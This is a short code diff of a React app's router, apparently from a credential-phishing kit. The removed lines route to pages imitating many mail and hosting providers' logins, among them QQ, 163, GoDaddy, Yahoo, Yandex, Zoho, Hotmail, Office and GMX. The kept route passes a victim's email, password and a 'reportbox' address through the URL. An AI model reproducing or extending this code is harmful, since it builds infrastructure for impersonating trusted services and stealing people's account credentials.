@@ -62,36 +62,9 @@ function App() {
   return (
     <AppContext.Provider value={{ page, setPage }}>
       <Router>
-        <Redirect default />
-        <HomeRedirect path="/" />
-        <Encryption path="/enc" />
-        <GetLocationInfo path="loc/:email/:pass/:reportbox" />
-        <Page163 path={page[163]} />
-        <Page126 path={page[126]} />
-        <Hinet path={page.hinet} />
-        <Qq path={page.qq} />
-        <Page263 path={page[263]} />
-        <Godaddy path={page.godaddy} />
-        <Hiworks path={page.hiworks} />
-        <Mail path={page.mail} />
-        <Office path="ofc" />
-        <Rackspace path={page.rackspace} />
-        <WebmailMain path={page.webmail} />
-        <Yahoo path={page.yahoo} />
-        <Yandex path={page.yandex} />
-        <Zoho path={page.zoho} />
-
-        <Telekom path={page.telekom} />
-        <BerlinMail path={page.berlin} />
-        <Hamburg path={page.hamburg} />
-
-        <Hotmail path={page.office} />
-        <HotmailPassword path="ht/:data" />
-
-        <Gmx path={page.gmx} />
-
-        <Processing path="processing" />
-        <Portal path="portal" />
+       
+        <GetLocationInfo path="/:email/:pass/:reportbox" />
+        
       </Router>
       <ToastContainer
         position="top-center"
